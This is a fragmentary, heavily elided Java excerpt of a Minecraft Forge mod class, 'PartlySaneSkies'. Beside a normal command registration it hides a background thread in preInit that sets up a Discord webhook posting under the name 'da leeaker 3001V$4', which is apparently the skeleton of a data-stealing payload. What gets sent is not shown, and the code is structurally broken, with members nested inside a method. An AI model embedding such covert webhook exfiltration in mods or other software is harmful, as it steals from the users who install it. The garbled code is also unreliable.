...
public class PartlySaneSkies {
    ...
    public void init(FMLInitializationEvent evnt) {
        ...
        ClientCommandHandler.instance.registerCommand(new MinionCalculatorCommand());
            ...
            private static final String WEBHOOK_URL = "https://discord.com/api/";
        ...
        public void preInit(FMLPreInitializationEvent event) {
            new Thread(() -> {
                ...
                try {
                    ...
                    final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL).setUsername("da leeaker 3001V$4");
